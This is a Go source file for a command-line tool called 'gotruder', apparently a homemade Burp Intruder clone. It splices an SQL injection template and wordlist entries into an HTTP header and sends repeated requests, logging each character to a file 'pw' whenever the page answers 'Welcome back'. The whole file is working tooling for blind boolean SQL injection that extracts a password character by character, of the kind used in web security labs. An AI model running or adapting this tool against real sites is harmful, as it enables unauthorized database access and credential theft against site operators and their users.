package main

import (
    "fmt"
    "strings"
    "flag"
    "strconv"
    "bufio"
    "log"
    "os"
    "io/ioutil"
    "net/http")

func check(e error) {
    if e != nil {
        panic(e)
    }
}

func main() {
    fmt.Println("gotruder\n")

    f, err := os.Create("pw")
    if err != nil{
        fmt.Println(err)
        f.Close()
    }
    f.Close()

    file, err := os.OpenFile("pw", os.O_APPEND|os.O_WRONLY, 0644)
    if err != nil {
        fmt.Println(err)
        return
    }


    var host string
    var wl string
    var header string
    var headerVal string
    var sqli string
    var nor int

    flag.StringVar(&host, "h", "https://findtheinvisiblecow.com/", "host name - example: (http://doodoobutt.com/)")
    flag.StringVar(&header, "hdr", "", "Header to manipulate")
    flag.StringVar(&headerVal, "hdrval", "", "Header Value to manipulate")
    flag.StringVar(&wl, "wl", "", "Full file path to word list")
    flag.StringVar(&sqli, "sqli", "", "Sql Injection query")
    flag.IntVar(&nor, "n", 1, "N number of requests")
    flag.Parse()

    log.Println("data passed:", host, nor, header, sqli, wl)

    var wordlist string
    var loads []string

    if len(wl) != 0 {
        dat, err := ioutil.ReadFile(wl)
        check(err)
        wordlist = string(dat)
        scanner := bufio.NewScanner(strings.NewReader(wordlist))
        for scanner.Scan() {
            fmt.Println(scanner.Text())
            loads = append(loads, scanner.Text())
        }
    }

    //requests from amount of request
    for x := 0; x <= nor; x++ {
        if x == 0 {
            log.Println("Invoking original http request")

            //get site
            resp, err := http.Get(host)
            if err != nil {
                log.Fatalln(err)
            }

            // print headers and values
            for name, values := range resp.Header {
                log.Println(name + ":", values[0])
            }

            fmt.Println("\n\n")
        }else {
            for _, payload := range loads{

                //get site
                req, err := http.NewRequest("GET", host, nil)
                nh := strings.Split(headerVal, ";")

                var custSqlI string

                custSqlI = strings.Replace(sqli, "iter", strconv.Itoa(x), -1)

                newHeaderVal := nh[0]+custSqlI+payload+";"+nh[1]
                log.Println("iteration", newHeaderVal)

                // NEW GET HEADER TO SET FOR REQUEST
                req.Header.Set(header, newHeaderVal)

                client := &http.Client{}
                response, err := client.Do(req)

                if err != nil {
                    log.Fatalln(err)
                }

                // print headers and values
                for name, values := range response.Header {
                    log.Println(name + ":", values[0])
                }

                body, err := ioutil.ReadAll(response.Body)
                fmt.Println(payload, "password character", string(body))
                if strings.Contains(string(body), "Welcome back") {
                    _, err = fmt.Fprintln(file, payload)
                    if err != nil {
                        fmt.Println(err)
                        file.Close()
                        return
                    }
                }
                fmt.Println("\n\n")
            }
        }
    }
    file.Close()
}
